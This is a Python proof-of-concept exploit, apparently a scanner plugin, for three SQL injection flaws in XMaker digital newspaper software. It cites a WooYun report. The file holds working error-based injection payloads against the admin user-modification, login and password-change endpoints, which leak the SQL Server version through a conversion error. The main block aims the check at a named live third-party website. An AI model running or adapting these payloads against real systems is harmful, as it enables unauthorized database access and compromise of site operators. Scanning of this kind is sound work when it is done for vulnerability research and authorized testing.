#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : XMaker数字报纸通用型post注入漏洞 3 处
Author    :  a
mail      :  a@lcx.cc
 
refer     :   WooYun-2015-151537  
 
"""
import urlparse

def assign(service, arg):
    if service == 'xplus':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    ps = [['www/index.php?mod=admin&con=user&act=modifyDo','userId=-1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&realName=111111&userMail=1111111111@qq.com&userTel=13909090099&userAge=age_b&checkMail=1&userStatus=1'],
          ['www/index.php?mod=admin&con=index&act=logindo','password=111111&vcode=11111&=11111&username=8111\'%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--'],
          ['www/index.php?mod=admin&con=adminuser&act=mypwdpost','mypwd%5BadminOld%5D=111111&mypwd%5BadminPwd%5D=111111&pwd2=111111&id=11111%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&adminuser_submit=%CC%E1%BD%BB']
          ]
    for p ,d in ps:
        url = arg + p
        code2, head, res, errcode, _ = curl.curl2(url ,d )
        #print res
        if (code2 ==200) and  ('ODBC SQL Server Driver' in res) and ('SQLExecute' in res) and ('GAO JI' in res):
             security_hole(url)

if __name__ == '__main__':
    from dummy import *
    #audit(assign('xplus', 'http://smrb.smnet.com.cn')[1])
    audit(assign('xplus', 'http://news.xd56b.com')[1])